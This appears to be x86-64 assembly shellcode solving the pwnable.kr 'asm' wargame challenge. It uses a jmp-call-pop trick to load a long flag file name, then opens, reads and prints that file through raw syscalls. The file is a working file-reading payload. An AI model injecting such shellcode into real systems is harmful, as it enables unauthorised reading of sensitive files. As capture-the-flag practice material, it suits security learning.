section .text
  global _start

_start:
  jmp trick

main_logic:
  pop rdi

  xor rax,rax
  mov al,2
  xor rsi,rsi
  xor rdx,rdx
  syscall

  mov rdi,rax
  xor rax,rax
  sub rsp,200
  mov rsi,rsp
  xor rdx,rdx
  mov dl,200
  syscall

  mov rdx,rax
  xor rax,rax
  mov al,1
  xor rdi,rdi
  mov dil,1
  mov rsi,rsp
  syscall

  xor rax,rax
  mov al,60
  xor rdi,rdi
  syscall

trick:
  call main_logic
  db 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', 0
